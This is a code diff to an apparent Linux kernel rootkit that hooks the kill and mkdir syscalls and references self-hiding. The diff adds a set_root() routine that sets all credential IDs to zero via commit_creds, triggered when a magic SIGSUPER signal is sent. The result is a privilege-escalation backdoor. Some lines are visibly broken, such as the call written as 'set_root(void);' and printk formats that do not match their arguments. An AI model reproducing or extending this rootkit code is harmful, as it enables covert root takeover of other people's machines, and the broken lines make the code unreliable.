@@ -49,6 +49,7 @@ static asmlinkage long hook_kill(const struct pt_regs *regs){
     
     if(sig == SIGSUPER){
         printk(KERN_INFO "signal: %d == SIGSUPER :d | hide itself/malware/etc", sig, SIGSUPER);
+        set_root(void);
         return 0;
     }else if(sig == SIGINVIS){
         printk(KERN_INFO "signal: %d == SIGINVIS :d | hide itself/malware/etc", sig, SIGINVIS);
@@ -78,7 +79,8 @@ static asmlinkage int hook_mkdir(const struct pt_regs *regs){
 #else
 static asmlinkage long hook_kill(pid_t pid, int sig){
     if(sig == SIGSUPER){
-        printk(KERN_INFO "signal: %d == SIGSUPER :d | hide itself/malware/etc", sig, SIGSUPER);
+        printk(KERN_INFO "signal: %d == SIGSUPER :d | giving root", sig, SIGSUPER);
+        set_root(void);
         return 0;
     }else if(sig == SIGINVIS){
         printk(KERN_INFO "signal: %d == SIGINVIS :d | hide itself/malware/etc", sig, SIGINVIS);
@@ -143,6 +145,22 @@ static asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode){
 //     __sys_call_table[__NR_kill] = (unsigned long)&hacked_kill;
 //     return 0;
 // }
+
+static void set_root(void){
+    struct cred *root;
+    root = prepare_creds();
+
+    if( root == NULL){
+        return;
+    }
+
+    root->uid.val = root->gid.val = 0;
+    root->euid.val = root-> egid.val =0;
+    root->suid.val = root->sgid.val = 0;
+    root->fsuid.val = root->fsgid.val = 0;
+
+    commit_creds(root);
+}
 
 /**
  * Custom write_cr0 function to unprotect memory
